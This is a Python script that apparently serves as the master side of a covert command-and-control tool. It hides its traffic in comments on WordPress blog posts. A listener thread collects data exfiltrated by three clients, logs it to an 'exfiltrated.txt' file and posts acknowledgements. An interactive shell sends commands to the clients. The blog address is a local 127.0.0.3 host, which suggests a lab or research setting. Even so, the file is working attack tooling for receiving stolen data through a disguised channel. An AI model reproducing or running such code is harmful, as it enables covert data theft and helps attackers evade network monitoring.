#!/usr/bin/env python3
from wpc2 import *
import cmd
import sys
import time
import datetime
import threading

server_id = sys.argv[1]
random.seed(int(datetime.datetime.now().timestamp()) + int(server_id))
is_debug = True if len(sys.argv) > 2 and sys.argv[2] == "-v" else False

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.ack_channel = "2021/08/13/ack-channel/"
channel.exfil_channel_id = get_post_id(channel.target_blog, channel.exfil_channel)
channel.ack_channel_id = get_post_id(channel.target_blog, channel.ack_channel)

btm_recv_config = ReceiveConfig()
btm_recv_config.recvr_id = server_id
btm_recv_config.recv_time_slot = 30
btm_recv_config.process_time_slot = 40
btm_recv_config.prev_unapproved_index = 0

mtb_send_config= SendConfig()
mtb_send_config.sender_id = server_id
mtb_send_config.send_time_slot = 10
mtb_send_config.confirm_time_slot = None # The master does not need to confim if its message has been sent successfully

class Client:
    id = ""
    time_slot = ""

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    log_print("## Created client with id: " + str(client.id), 2)

def thread_start_listener():
    if btm_recv_config.prev_unapproved_index == 0:
        btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    while(True):
        received_data = receive_data(channel, len(clients), btm_recv_config)

        for exfil_content in received_data:
            to_write = str(datetime.datetime.utcnow()) + ": "
            to_write += "Extracted data with timeslot of " + str(btm_recv_config.recv_time_slot) + ": " + exfil_content + "\n"
            log_print("[INFO] thread_start_listener: " + to_write, 2);
            f = open("../output/exfiltrated.txt", "a")
            f.write(to_write)
            f.close()

            message_id = exfil_content.split(":")[0]
            log_print("[INFO " + str(datetime.datetime.utcnow()) + "] thread_start_listener: Received message with ID " + message_id + ". Sending acknowledgement...", 1)
            response = submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
            log_print("## " + str(response.html_response_code) + ", " + response.html_response, 2)

        btm_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)            

threading.Thread(target=thread_start_listener).start()
time.sleep(1)

class ServerShell(cmd.Cmd):
    intro = "Intro"
    prompt = ">> "

    def do_info(self, args):
        log_print("[INFO] Sending info command to clients...", 1)
        message = Message()
        message.message_id = generate_random_string(10)
        message.message = message.message_id + ": Info"
        send_data(channel, message, mtb_send_config)

ServerShell().cmdloop()
sys.exit()
